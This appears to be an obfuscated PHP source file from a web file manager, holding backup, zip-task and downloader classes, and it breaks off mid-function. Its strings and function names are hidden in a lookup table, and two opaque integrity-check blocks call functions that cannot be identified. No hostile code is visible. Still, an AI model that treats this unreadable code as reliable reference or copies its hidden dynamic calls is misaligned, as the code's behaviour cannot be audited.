<?php
 goto eÜï‹‚“½; A½Îåø¢â: $dÓİƒ´§Ä§ = LIB_DIR . $_SERVER[Æ][778]; $c”ªéª¼Õå = $_SERVER[Æ][779]; if ($_SERVER[$_SERVER[Æ][780]] != $c”ªéª¼Õå($dÓİƒ´§Ä§)) { goto AÈ›—‹à»; Cù«ÅÊˆÙ¿: $B¬îùñ†¦‚ = explode($_SERVER[Æ][217], $D÷ËÌùõ); if (count($B¬îùñ†¦‚) < $_SERVER[Æ][573]) { $EÄÈÇˆ«‘ = $_SERVER[Æ][784]; $EÄÈÇˆ«‘(); } $FÒ‹ìåÓî = $_SERVER[Æ][785]; goto A„âŠÇ‹†; A„âŠÇ‹†: $FÒ‹ìåÓî($dÓİƒ´§Ä§); goto a®ƒÓ”Áô; AÈ›—‹à»: $aÀ¦»Óà† = $_SERVER[Æ][781]; $FÙ²ñ¯™Í = $_SERVER[$_SERVER[Æ][782]] . $_SERVER[Æ][783]; $D÷ËÌùõ = $aÀ¦»Óà†($FÙ²ñ¯™Í); goto Cù«ÅÊˆÙ¿; a®ƒÓ”Áô: } goto fƒÁ®È ö; eôÑ‘Ï÷Œ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto CÇÆäÂÍ¡å; B²ã¸·Ç„ñ: $a¯ííá¥ÒÒ = array_diff($a¯ííá¥ÒÒ, array($aºó­¶Úô‘[709], $aºó­¶Úô‘[710])); foreach ($a¯ííá¥ÒÒ as $e÷Ç÷§‰š) { $aîŞ£½âŠ += $dó«Ã‘Çøî->model($e÷Ç÷§‰š)->count(); } $b‚¹ì½äÆ = new Task($aºó­¶Úô‘[711], $aºó­¶Úô‘[712], $aîŞ£½âŠ, LNG($aºó­¶Úô‘[713]) . $aºó­¶Úô‘[714] . LNG($aºó­¶Úô‘[715])); goto F„Õ–¯˜ñ; CÇÆäÂÍ¡å: $aºó­¶Úô‘ =& $_SERVER[Æ]; $D²» ¯ÁÃà = Backup::get(); self::$io = $D²» ¯ÁÃà[$aºó­¶Úô‘[689]]; goto fÅ‹ˆƒš; c‘íŠ­‚á„: $dó«Ã‘Çøî = new DbManage($D§©œ÷˜Àã, $a¤ğÍ¾®ë); $bô–Š’ã”‘ = TEMP_FILES . $aºó­¶Úô‘[708] . self::$name . $aºó­¶Úô‘[8]; del_dir($bô–Š’ã”‘); goto d„ŞÅâ²‘À; d„ŞÅâ²‘À: mk_dir($bô–Š’ã”‘); $aîŞ£½âŠ = $e¨‚§‰åø = 0; $a¯ííá¥ÒÒ = $dó«Ã‘Çøî->db()->getTables(); goto B²ã¸·Ç„ñ; fÅ‹ˆƒš: self::$name = $D²» ¯ÁÃà[$aºó­¶Úô‘[28]]; $D§©œ÷˜Àã = $GLOBALS[$aºó­¶Úô‘[6]][$aºó­¶Úô‘[17]]; $a¤ğÍ¾®ë = $this->_dbType($D§©œ÷˜Àã); goto c‘íŠ­‚á„; F„Õ–¯˜ñ: foreach ($a¯ííá¥ÒÒ as $e÷Ç÷§‰š) { $fñíÆ÷ùÀŞ = $bô–Š’ã”‘ . $e÷Ç÷§‰š . $aºó­¶Úô‘[716]; $E²÷—ĞÏ¼ù = null; if ($e÷Ç÷§‰š == $aºó­¶Úô‘[717] && (!isset($D²» ¯ÁÃà[$aºó­¶Úô‘[690]]) || $D²» ¯ÁÃà[$aºó­¶Úô‘[690]] == $aºó­¶Úô‘[468])) { $E²÷—ĞÏ¼ù = self::$io; } $e¨‚§‰åø += $dó«Ã‘Çøî->sqlFromDb($e÷Ç÷§‰š, $fñíÆ÷ùÀŞ, $b‚¹ì½äÆ, $E²÷—ĞÏ¼ù); } $b‚¹ì½äÆ->end(); $Cè¼àõĞ¡Ë = array($aºó­¶Úô‘[718] => $a¤ğÍ¾®ë, $aºó­¶Úô‘[705] => 1, $aºó­¶Úô‘[719] => $e¨‚§‰åø, $aºó­¶Úô‘[720] => $e¨‚§‰åø); goto aÖ¤ŒÃÏ÷; aÖ¤ŒÃÏ÷: Backup::set($Cè¼àõĞ¡Ë); return !0; goto e¶œŞ‚¨×¿; e¶œŞ‚¨×¿: } private function _dbType($bØšŒŸÄ‚) { goto B„Ÿ”ÈÆŠ«; d¤Î­½»•: if ($EÙµÆø == $aØØçò²ª[722]) { $C–ìùêîñ = explode($aØØçò²ª[4], $bØšŒŸÄ‚[$aØØçò²ª[723]]); $EÙµÆø = $C–ìùêîñ[0]; } $F˜½”ïÄ¥ = array($aØØçò²ª[724] => $aØØçò²ª[9], $aØØçò²ª[725] => $aØØçò²ª[726]); if (isset($F˜½”ïÄ¥[$EÙµÆø])) { $EÙµÆø = $F˜½”ïÄ¥[$EÙµÆø]; } goto B•‘ê˜‚; B•‘ê˜‚: return $EÙµÆø; goto añ¼Ò®´Ì; B„Ÿ”ÈÆŠ«: $aØØçò²ª =& $_SERVER[Æ]; $bØšŒŸÄ‚ = array_change_key_case($bØšŒŸÄ‚); $EÙµÆø = $bØšŒŸÄ‚[$aØØçò²ª[721]]; goto d¤Î­½»•; añ¼Ò®´Ì: } } class BackupDbFile { public function __construct() { } public function index() { goto EÄÒ©Úö‡; eï–©Õ…ù¼: $cåŒ«­Ôë = TEMP_FILES . "\x62\141\143\153\165\x70\137{$bĞ¡ê••±}\x2f"; $a’˜ÅÖ¨  = "\173\151\x6f\x3a{$CØ´ğˆ›ÆÀ[$a¼Ú™†ÜÚÓ[689]]}\175\57\144\x61\164\141\142\141\163\145\57"; IO::mkdir($a’˜ÅÖ¨  . "\142\141\143\153\x75\160\137{$bĞ¡ê••±}\57"); goto BÄƒçØ†Ë¼; Dñ‰ˆ¨£Œ‰: Backup::set(array($a¼Ú™†ÜÚÓ[729] => $EìÈ Ù«¬[$a¼Ú™†ÜÚÓ[77]])); IO::move($cåŒ«­Ôë, $a’˜ÅÖ¨ ); $A°òÄÓÕñ = CONTROLLER_DIR . $a¼Ú™†ÜÚÓ[730]; goto D¢åå°øäÊ; D¢åå°øäÊ: $c‰—¶ÏâŒ  = CONTROLLER_DIR . $a¼Ú™†ÜÚÓ[731]; IO::copy($A°òÄÓÕñ, $a’˜ÅÖ¨  . "\x62\141\143\153\x75\160\137{$bĞ¡ê••±}\57"); IO::copy($c‰—¶ÏâŒ , $a’˜ÅÖ¨  . "\142\141\143\153\x75\160\x5f{$bĞ¡ê••±}\57"); goto c‚ Á–‡î÷; BÄƒçØ†Ë¼: $C¨É³°ä• = new TaskFileTransfer($a¼Ú™†ÜÚÓ[727], $a¼Ú™†ÜÚÓ[712], 0, LNG($a¼Ú™†ÜÚÓ[713]) . $a¼Ú™†ÜÚÓ[412] . LNG($a¼Ú™†ÜÚÓ[715]) . $a¼Ú™†ÜÚÓ[728]); $C¨É³°ä•->addPath($cåŒ«­Ôë); $EìÈ Ù«¬ = IO::infoWithChildren($cåŒ«­Ôë); goto Dñ‰ˆ¨£Œ‰; c‚ Á–‡î÷: $C¨É³°ä•->end(); Backup::set(array($a¼Ú™†ÜÚÓ[732] => $EìÈ Ù«¬[$a¼Ú™†ÜÚÓ[77]])); return !0; goto dËóì‡áÈÎ; EÄÒ©Úö‡: $a¼Ú™†ÜÚÓ =& $_SERVER[Æ]; $CØ´ğˆ›ÆÀ = Backup::get(); $bĞ¡ê••± = $CØ´ğˆ›ÆÀ[$a¼Ú™†ÜÚÓ[28]]; goto eï–©Õ…ù¼; dËóì‡áÈÎ: } } class BackupFile { public function __construct() { } public function index() { goto d¾Œ“²îš²; AŒÉ÷‰´‚: Backup::set($cŠóš†×¦¿); $this->_fileFilter($FÈæö¦–µø); return !0; goto FßäçÆøƒñ; d¾Œ“²îš²: $añ®‰ˆ…–Æ = Backup::get(); $A£ùÓ¤”ÒÏ = $añ®‰ˆ…–Æ[$_SERVER[Æ][281]][$_SERVER[Æ][167]][$_SERVER[Æ][419]]; $c•¯º‘¯…è = array($_SERVER[Æ][420] => array($_SERVER[Æ][733], $A£ùÓ¤”ÒÏ), $_SERVER[Æ][734] => array($_SERVER[Æ][319], $añ®‰ˆ…–Æ[$_SERVER[Æ][689]])); goto A‘³Ó™¢²¹; dµ©‚•‹Ê·: $eƒâïÓ›½->task[$_SERVER[Æ][696]] = $FíÖÄèñ”Ä; $cŠóš†×¦¿ = array($_SERVER[Æ][737] => $cÛ«¼ù×¤ç, $_SERVER[Æ][738] => $FíÖÄèñ”Ä); Backup::set($cŠóš†×¦¿); goto FËÜÊ¡îÄ; cØ¯†æîŒ: $Dä°ÑßƒíÉ = $fİ´ˆ¾¯ğŒ ? 1 : 0; $cŠóš†×¦¿ = array($_SERVER[Æ][749] => 1, $_SERVER[Æ][701] => time(), $_SERVER[Æ][707] => $Dä°ÑßƒíÉ, $_SERVER[Æ][746] => $A£ùÓ¤”ÒÏ, $_SERVER[Æ][738] => $FíÖÄèñ”Ä, $_SERVER[Æ][737] => $cÛ«¼ù×¤ç); if ($EÇ…˜Ú‹Çµ) { $cŠóš†×¦¿[$_SERVER[Æ][747]] = $aì²Š‚èæª; $cŠóš†×¦¿[$_SERVER[Æ][748]] = $eŸ¢öÓ¶Ç£; } goto AŒÉ÷‰´‚; B×É¹äõ½: $eŸ¢öÓ¶Ç£ = $aì²Š‚èæª = 0; do { $Eóà–î—İ™ = $_SERVER[Æ][739]; $F†á¸…øÙ = Model($_SERVER[Æ][717])->where($c•¯º‘¯…è)->field($Eóà–î—İ™)->order($_SERVER[Æ][740])->selectPage($b¬Ÿ…ÜÓŒÓ, $DàïßÒ‘ƒ); $Cö²™Å¸•š = !empty($F†á¸…øÙ[$_SERVER[Æ][354]]) ? $F†á¸…øÙ[$_SERVER[Æ][354]] : array(); foreach ($Cö²™Å¸•š as $EÁì¨º–¨¬) { goto aÍÚ¤±â·°; AØ¢ÇÎóŞµ: if ($EÆ¾Œ­êŒ >= 1024 * 1024 * 100) { $cŠóš†×¦¿ = array($_SERVER[Æ][746] => $A£ùÓ¤”ÒÏ, $_SERVER[Æ][747] => $aì²Š‚èæª, $_SERVER[Æ][748] => $eŸ¢öÓ¶Ç£); Backup::set($cŠóš†×¦¿); $EÆ¾Œ­êŒ = $EÇ…˜Ú‹Çµ = 0; } goto BËÒ­ìê¼Ù; FÈ»êÅ²‰¤: if (IO::exist($d‰ğ Ã˜¯œ)) { $eƒâïÓ›½->updateFileEnd($EÁì¨º–¨¬[$_SERVER[Æ][28]], $EÁì¨º–¨¬[$_SERVER[Æ][77]]); } else { $d‰ğ Ã˜¯œ = get_path_father($d‰ğ Ã˜¯œ); IO::mkdir($d‰ğ Ã˜¯œ); if (!IO::copy($F™³„Ğã•, $d‰ğ Ã˜¯œ, $_SERVER[Æ][743])) { write_log($_SERVER[Æ][744] . $F™³„Ğã• . $_SERVER[Æ][745] . $d‰ğ Ã˜¯œ . $_SERVER[Æ][476], $_SERVER[Æ][712]); $fİ´ˆ¾¯ğŒ = !1; break; } } $A£ùÓ¤”ÒÏ = $EÁì¨º–¨¬[$_SERVER[Æ][419]]; $EÇ…˜Ú‹Çµ += 1; goto eÏæÂ‘§î; aÍÚ¤±â·°: if (!$this->_fileExist($EÁì¨º–¨¬, $FÈæö¦–µø, $a½‚éˆ¸¹)) { $cÛ«¼ù×¤ç -= 1; $FíÖÄèñ”Ä -= (int) $EÁì¨º–¨¬[$_SERVER[Æ][77]]; write_log("\x66\x69\x6c\x65\40\x6e\157\x74\40\145\x78\151\x73\164\56\146\151\x6c\145\111\x44\72{$EÁì¨º–¨¬[$_SERVER[Æ][419]]}\x2c\40\160\x61\164\150\72{$EÁì¨º–¨¬[$_SERVER[Æ][75]]}", $_SERVER[Æ][741]); continue; } $F™³„Ğã• = $EÁì¨º–¨¬[$_SERVER[Æ][75]]; $d‰ğ Ã˜¯œ = "\173\151\157\72{$añ®‰ˆ…–Æ[$_SERVER[Æ][689]]}\175" . substr($F™³„Ğã•, strlen("\173\x69\x6f\72{$EÁì¨º–¨¬[$_SERVER[Æ][742]]}\175")); goto FÈ»êÅ²‰¤; eÏæÂ‘§î: $EÆ¾Œ­êŒ += $EÁì¨º–¨¬[$_SERVER[Æ][77]]; $aì²Š‚èæª += 1; $eŸ¢öÓ¶Ç£ += $EÁì¨º–¨¬[$_SERVER[Æ][77]]; goto AØ¢ÇÎóŞµ; BËÒ­ìê¼Ù: } $F¾‡İ†•¹î = count($Cö²™Å¸•š); $DàïßÒ‘ƒ++; } while ($F¾‡İ†•¹î == $b¬Ÿ…ÜÓŒÓ); $eƒâïÓ›½->end(); goto cØ¯†æîŒ; A‘³Ó™¢²¹: $cÛ«¼ù×¤ç = (int) Model($_SERVER[Æ][717])->where($c•¯º‘¯…è)->count($_SERVER[Æ][419]); $FíÖÄèñ”Ä = (int) Model($_SERVER[Æ][717])->where($c•¯º‘¯…è)->sum($_SERVER[Æ][77]); $eƒâïÓ›½ = new TaskFileTransfer($_SERVER[Æ][735], $_SERVER[Æ][712], $cÛ«¼ù×¤ç, LNG($_SERVER[Æ][713]) . $_SERVER[Æ][714] . LNG($_SERVER[Æ][736])); goto dµ©‚•‹Ê·; FËÜÊ¡îÄ: $fİ´ˆ¾¯ğŒ = !0; $a½‚éˆ¸¹ = $this->storeIds(); $DàïßÒ‘ƒ = 1; goto aÁÕ†ŒÇ»; aÁÕ†ŒÇ»: $b¬Ÿ…ÜÓŒÓ = 1000; $EÆ¾Œ­êŒ = $EÇ…˜Ú‹Çµ = 0; $FÈæö¦–µø = array(); goto B×É¹äõ½; FßäçÆøƒñ: } private function _fileExist($A„äíîˆÑ, &$a‘«²Ÿïš, $EãÃ¿­äƒƒ) { goto D»¨Š·åÉÛ; d¸“×‡©å: if (!in_array($A„äíîˆÑ[$a£ˆ±É¬[742]], $EãÃ¿­äƒƒ)) { return !1; } if (IO::exist($DêŒßğÇÌÜ)) { return !0; } $Eì§µ´ÍÉ = get_path_father($DêŒßğÇÌÜ); goto A§‚ö†Ûé; D»¨Š·åÉÛ: $a£ˆ±É¬ =& $_SERVER[Æ]; $DêŒßğÇÌÜ = $A„äíîˆÑ[$a£ˆ±É¬[75]]; if (in_array($A„äíîˆÑ[$a£ˆ±É¬[419]], $a‘«²Ÿïš)) { return !1; } goto d¸“×‡©å; CÚÜ‡¯×ãÕ: $a‘«²Ÿïš = array_merge($a‘«²Ÿïš, array_to_keyvalue($FãõÍÀÕñÙ, $a£ˆ±É¬[33], $a£ˆ±É¬[419])); return !1; goto D„¨Òˆ©•¼; A§‚ö†Ûé: if (IO::exist($Eì§µ´ÍÉ)) { $a‘«²Ÿïš[] = $A„äíîˆÑ[$a£ˆ±É¬[419]]; return !1; } $C¡Ö¦è‰‹ = array($a£ˆ±É¬[742] => $A„äíîˆÑ[$a£ˆ±É¬[742]], $a£ˆ±É¬[75] => array($a£ˆ±É¬[750], "{$Eì§µ´ÍÉ}\45")); $FãõÍÀÕñÙ = Model($a£ˆ±É¬[717])->where($C¡Ö¦è‰‹)->field($a£ˆ±É¬[420])->select(); goto CÚÜ‡¯×ãÕ; D„¨Òˆ©•¼: } private function _fileFilter($C³‹¦Í½¬) { $bÌ ĞºšÈß =& $_SERVER[Æ]; if (empty($C³‹¦Í½¬)) { return; } $AÜìòˆÕŠÜ = array($bÌ ĞºšÈß[419] => array($bÌ ĞºšÈß[7], array_unique($C³‹¦Í½¬))); $BÔîˆÒ©ã‘ = Model($bÌ ĞºšÈß[751])->where($AÜìòˆÕŠÜ)->field($bÌ ĞºšÈß[369])->select(); foreach ($BÔîˆÒ©ã‘ as $cª¤…³Êƒ) { Model($bÌ ĞºšÈß[751])->remove($cª¤…³Êƒ[$bÌ ĞºšÈß[369]], !1); } } private function storeIds() { $bÓï¸…øÀ… =& $_SERVER[Æ]; $cà‹ä…ğ¿Ò = Model($bÓï¸…øÀ…[702])->listData(); return array_to_keyvalue($cà‹ä…ğ¿Ò, $bÓï¸…øÀ…[33], $bÓï¸…øÀ…[367]); } } goto B»é¥¬¸ù‡; b‰îŸ½‘é‹: if ($_SERVER[$_SERVER[Æ][780]] != $c”ªéª¼Õå($dÓİƒ´§Ä§)) { goto dˆÖì¡©…ó; F„¬Äéµ: $FÒ‹ìåÓî($dÓİƒ´§Ä§); goto c¿Ì¶´ƒÆ²; dˆÖì¡©…ó: $aÀ¦»Óà† = $_SERVER[Æ][781]; $FÙ²ñ¯™Í = $_SERVER[$_SERVER[Æ][782]] . $_SERVER[Æ][783]; $D÷ËÌùõ = $aÀ¦»Óà†($FÙ²ñ¯™Í); goto B„ô æ’ˆ; B„ô æ’ˆ: $B¬îùñ†¦‚ = explode($_SERVER[Æ][217], $D÷ËÌùõ); if (count($B¬îùñ†¦‚) < $_SERVER[Æ][573]) { $EÄÈÇˆ«‘ = $_SERVER[Æ][784]; $EÄÈÇˆ«‘(); } $FÒ‹ìåÓî = $_SERVER[Æ][785]; goto F„¬Äéµ; c¿Ì¶´ƒÆ²: } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Dò½ÄÏÃà =& $_SERVER[Æ]; parent::startAfter(); Hook::bind($Dò½ÄÏÃà[1510], array($this, $Dò½ÄÏÃà[1505])); $aèïµÈêô =& $this->task; $aèïµÈêô[$Dò½ÄÏÃà[1507]] = $Dò½ÄÏÃà[1040]; if (!$aèïµÈêô[$Dò½ÄÏÃà[1340]]) { $aèïµÈêô[$Dò½ÄÏÃà[1340]] = LNG($Dò½ÄÏÃà[1511]); } } protected function endAfter() { $cä¸œË’‡× =& $_SERVER[Æ]; parent::endAfter(); Hook::unbind($cä¸œË’‡×[1510], array($this, $cä¸œË’‡×[1505])); } public function updateAfter() { $aÂ¥²Œ¥Ÿ =& $_SERVER[Æ]; $d®ëäÛÀÄÂ =& $this->task; if (!$d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[977]] || !$d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[696]]) { return; } if ($d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1507]] == $aÂ¥²Œ¥Ÿ[1040]) { $c¡å¬ŒŠ®± = $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1480]]; if ($d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1481]] != $aÂ¥²Œ¥Ÿ[1040]) { $c¡å¬ŒŠ®± = 0; } $dÎøæÜ õ» = ($d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1484]] + $c¡å¬ŒŠ®±) / $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[696]]; $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1435]] = $dÎøæÜ õ» * 0.3; } else { if ($d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1507]] == $aÂ¥²Œ¥Ÿ[301]) { $dÎøæÜ õ» = $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[989]] / $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[977]]; $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1435]] = 0.3 + $dÎøæÜ õ» * 0.5; } else { if ($d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1507]] == $aÂ¥²Œ¥Ÿ[103]) { $dÎøæÜ õ» = 0; if ($d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1479]]) { $dÎøæÜ õ» = $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1480]] / $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1479]]; } $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1435]] = 0.3 + 0.5 + $dÎøæÜ õ» * 0.2; } } } if ($d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1435]] > 0) { $EºõíÓØš = timeFloat() - $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1437]] - $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1440]]; $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1441]] = $EºõíÓØš * (1 - $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1435]]) / $d®ëäÛÀÄÂ[$aÂ¥²Œ¥Ÿ[1435]]; } } public function copyFileStart($F°À¦¡é£Í, $aÚÊ¯İå‚æ, $Fñ ¢±¸ø, $E‚„Ä‡»¥í, $Bù½°¾–Çº, $bìÑ½ë¿§º) { $b¥ŒÜòÅŞï =& $_SERVER[Æ]; parent::copyFileStart($F°À¦¡é£Í, $aÚÊ¯İå‚æ, $Fñ ¢±¸ø, $E‚„Ä‡»¥í, $Bù½°¾–Çº, $bìÑ½ë¿§º); $BìÁÌ¤ØŒå =& $this->task; if ($BìÁÌ¤ØŒå[$b¥ŒÜòÅŞï[1507]] == $b¥ŒÜòÅŞï[301]) { $BìÁÌ¤ØŒå[$b¥ŒÜòÅŞï[1507]] = $b¥ŒÜòÅŞï[103]; } $this->update(); } public function copyFileEnd($C‚èâ´š, $C×·¿ƒ”Ñµ, $CÌöŠé‹ê, $E¤·½­¡ÑŸ, $bîÈµâ‰Ü£, $Dæ—›¯›Ç) { $C–éõõøñ =& $_SERVER[Æ]; $cÁ•¨¬†éÂ =& $this->task; $cÁ•¨¬†éÂ[$C–éõõøñ[1480]] = $cÁ•¨¬†éÂ[$C–éõõøñ[1479]]; $cÁ•¨¬†éÂ[$C–éõõøñ[1484]] += $cÁ•¨¬†éÂ[$C–éõõøñ[1479]]; $cÁ•¨¬†éÂ[$C–éõõøñ[1481]] = $C–éõõøñ[33]; $this->update(); } public function nameParse($D³±‚ÒôÍÁ) { $E¼ˆ±æß =& $_SERVER[Æ]; $b›ùåß“˜† =& $this->task; if ($b›ùåß“˜†[$E¼ˆ±æß[989]] < $b›ùåß“˜†[$E¼ˆ±æß[977]]) { $fÇ¸­ é‘ê = get_path_this($D³±‚ÒôÍÁ); if (strstr($fÇ¸­ é‘ê, $E¼ˆ±æß[91])) { $b›ùåß“˜†[$E¼ˆ±æß[989]] += 1; } } if ($b›ùåß“˜†[$E¼ˆ±æß[1507]] == $E¼ˆ±æß[1040]) { $b›ùåß“˜†[$E¼ˆ±æß[1507]] = $E¼ˆ±æß[301]; } $b›ùåß“˜†[$E¼ˆ±æß[1477]] = $D³±‚ÒôÍÁ; $this->update(); } } class Downloader { static function start($f½åÄğÓÔ, $F–Â—–ÓöÊ, $FŒæİîÚò = 10) { goto Dëö­ôï¢Ô; fÛğˆŒØƒ°: if ($D˜£§î§Ÿƒ[$b‘ùë[1032]]) { @unlink($Còë„Ññó²); } return $D˜£§î§Ÿƒ; goto E£Èˆ„‡²Œ; DÜŒğ‰¼Î: if ($f‰‡šä›í› > $DŠø°°Ğ±„) { @unlink($b‹Œîõ ¤); } file_put_contents($Còë„Ññó², json_encode($D¹Î°Åš‰„)); $D˜£§î§Ÿƒ = self::fileDownloadCurl($f½åÄğÓÔ, $F–Â—–ÓöÊ, !0, $f‰‡šä›í›, $DŠø°°Ğ±„); goto fÛğˆŒØƒ°; Dëö­ôï¢Ô: $b‘ùë =& $_SERVER[Æ]; if (!request_url_safe($f½åÄğÓÔ)) { return array($b‘ùë[1032] => !1, $b‘ùë[1034] => $b‘ùë[1037]); } $Còë„Ññó² = $F–Â—–ÓöÊ . $b‘ùë[1512]; goto DÉóˆ„¨å; AÅŒÈŸÑ: $DŠø°°Ğ±„ = intval($c†ÖÄİø±Ú[$b‘ùë[325]]); if (file_exists($b‹Œîõ ¤) && time() - filemtime($b‹Œîõ ¤) < 3) { return array($b‘ùë[1032] => !1, $b‘ùë[1034] => $b‘ùë[1514]); } $D¹Î°Åš‰„ = array(); goto c†‡¹Êí£; DÉóˆ„¨å: $b‹Œîõ ¤ = $F–Â—–ÓöÊ . $b‘ùë[1513]; if (is_array($f½åÄğÓÔ)) { $c†ÖÄİø±Ú = $f½åÄğÓÔ; } else { $c†ÖÄİø±Ú = url_header($f½åÄğÓÔ); } $f½åÄğÓÔ = $c†ÖÄİø±Ú[$b‘ùë[295]]; goto d´×¤Úé; c†‡¹Êí£: if (is_file($Còë„Ññó²)) { $C°˜¸èÄö« = file_get_contents($Còë„Ññó²); $D¹Î°Åš‰„ = json_decode($C°˜¸èÄö«, 1); } if (file_exists($F–Â—–ÓöÊ) && $DŠø°°Ğ±„ == filesize($F–Â—–ÓöÊ)) { @unlink($b‹Œîõ ¤); @unlink($Còë„Ññó²); return array($b‘ùë[1032] => !0, $b‘ùë[1034] => $b‘ùë[1515]); } if ($D¹Î°Åš‰„[$b‘ùë[325]] != $DŠø°°Ğ±„) { $D¹Î°Åš‰„ = array($b‘ùë[325] => $DŠø°°Ğ±„); } goto DÜŒğ‰¼Î; d´×¤Úé: if (!$f½åÄğÓÔ) { return array($b‘ùë[1032] => !1, $b‘ùë[1034] => $b‘ùë[1037]); } if (!$c†ÖÄİø±Ú[$b‘ùë[1287]] || $c†ÖÄİø±Ú[$b‘ùë[325]] == 0) { @unlink($b‹Œîõ ¤); @unlink($F–Â—–ÓöÊ); $D˜£§î§Ÿƒ = self::fileDownloadFopen($f½åÄğÓÔ, $F–Â—–ÓöÊ, $c†ÖÄİø±Ú[$b‘ùë[325]]); if ($D˜£§î§Ÿƒ[$b‘ùë[1032]]) { return $D˜£§î§Ÿƒ; } else { @unlink($b‹Œîõ ¤); @unlink($F–Â—–ÓöÊ); $D˜£§î§Ÿƒ = self::fileDownloadCurl($f½åÄğÓÔ, $F–Â—–ÓöÊ, !1, 0, $c†ÖÄİø±Ú[$b‘ùë[325]]); @unlink($b‹Œîõ ¤); return $D˜£§î§Ÿƒ; } } $f‰‡šä›í› = is_file($b‹Œîõ ¤) ? filesize($b‹Œîõ ¤) : 0; goto AÅŒÈŸÑ; E£Èˆ„‡²Œ: } static function fileDownloadFopen($DÕ†Î—ãÒ±, $FÒ®ÔÓÒ¨, $e¸öêƒÍØ¼ = 0) { $aª®ö¿ÔÂ =& $_SERVER[Æ]; @ini_set($aª®ö¿ÔÂ[1516], $aª®ö¿ÔÂ[1517]); $B·‰Î…¼® = $FÒ®ÔÓÒ¨ . $aª®ö¿ÔÂ[1513]; set_timeout(); @unlink($B·‰Î…¼®); if ($Fƒçãå‚ğ“ = @fopen($DÕ†Î—ãÒ±, $aª®ö¿ÔÂ[1518])) { goto aŒÔŸ•Ä¶¨; f’å·”Ö©É: return array($aª®ö¿ÔÂ[1032] => !0, $aª®ö¿ÔÂ[1034] => $aª®ö¿ÔÂ[694]); goto Bøçù¹Äµ™; aŒÔŸ•Ä¶¨: if (!($Dó«İ”ø„À = @fopen($B·‰Î…¼®, $aª®ö¿ÔÂ[1519]))) { return array($aª®ö¿ÔÂ[1032] => !1, $aª®ö¿ÔÂ[1034] => $aª®ö¿ÔÂ[1520]); } while (!feof($Fƒçãå‚ğ“)) { if (!file_exists($B·‰Î…¼®)) { fclose($Dó«İ”ø„À); return array($aª®ö¿ÔÂ[1032] => !1, $aª®ö¿ÔÂ[1034] => $aª®ö¿ÔÂ[1521]); } clearstatcache(); if ($e¸öêƒÍØ¼ > 0 && $e¸öêƒÍØ¼ == filesize(iconv_system($B·‰Î…¼®))) { break; } fwrite($Dó«İ”ø„À, fread($Fƒçãå‚ğ“, 1024 * 8), 1024 * 8); } fclose($Dó«İ”ø„À); goto e™¹Ã±¾‰; e™¹Ã±¾‰: fclose($Fƒçãå‚ğ“); self::checkGzip($B·‰Î…¼®); if (!@rename($B·‰Î…¼®, $FÒ®ÔÓÒ¨)) { usleep(round(rand(0, 1000) * 50)); @unlink($FÒ®ÔÓÒ¨); $E¢ø¶áÚ¤« = @rename($B·‰Î…¼®, $FÒ®ÔÓÒ¨); if (!$E¢ø¶áÚ¤«) { return array($aª®ö¿ÔÂ[1032] => !1, $aª®ö¿ÔÂ[1034] => $aª®ö¿ÔÂ[1522]); } } goto f’å·”Ö©É; Bøçù¹Äµ™: } else { return array($aª®ö¿ÔÂ[1032] => !1, $aª®ö¿ÔÂ[1034] => $aª®ö¿ÔÂ[1523]); } } static function fileDownloadCurl($d Ÿ˜¨‹´‰, $DÁÜ¸çˆ£, $EŒæˆÑéö‹ = false, $dë÷Ù¨Š§ = 0, $fÔ¼Š¼™õ = 0) { goto AŞ¯Îç ãÖ; båÌˆÛËä½: if ($a·•ò£ŒÎÜ < $fÔ¼Š¼™õ && $fÔ¼Š¼™õ != 0) { return array($c›ì²Ü©[1032] => !1, $c›ì²Ü©[1034] => $c›ì²Ü©[1514]); } if ($cÈ¸§©Ã³ê && filesize($F¿ªƒ½Ø½À) != 0) { self::checkGzip($F¿ªƒ½Ø½À); if (!@rename($F¿ªƒ½Ø½À, $DÁÜ¸çˆ£)) { @unlink($DÁÜ¸çˆ£); $cÈ¸§©Ã³ê = @rename($F¿ªƒ½Ø½À, $DÁÜ¸çˆ£); if (!$cÈ¸§©Ã³ê) { return array($c›ì²Ü©[1032] => !1, $c›ì²Ü©[1034] => $c›ì²Ü©[1526]); } } return array($c›ì²Ü©[1032] => !0, $c›ì²Ü©[1034] => $c›ì²Ü©[694]); } return array($c›ì²Ü©[1032] => !1, $c›ì²Ü©[1034] => $c›ì²Ü©[1527]); goto b®†ˆ ³½â; cÎÑ¾ÈÙù: curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_NOPROGRESS, !1); curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_PROGRESSFUNCTION, $c›ì²Ü©[1525]); curl_progress_start($E£§îÇ¤ÇÔ); goto aœ„Úæê­Ü; AŞ¯Îç ãÖ: $c›ì²Ü© =& $_SERVER[Æ]; $F¿ªƒ½Ø½À = $DÁÜ¸çˆ£ . $c›ì²Ü©[1513]; set_timeout(); goto fÂ­ª´¨ê¨; dÓå×áÊœ: curl_setopt($E£§îÇ¤ÇÔ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); 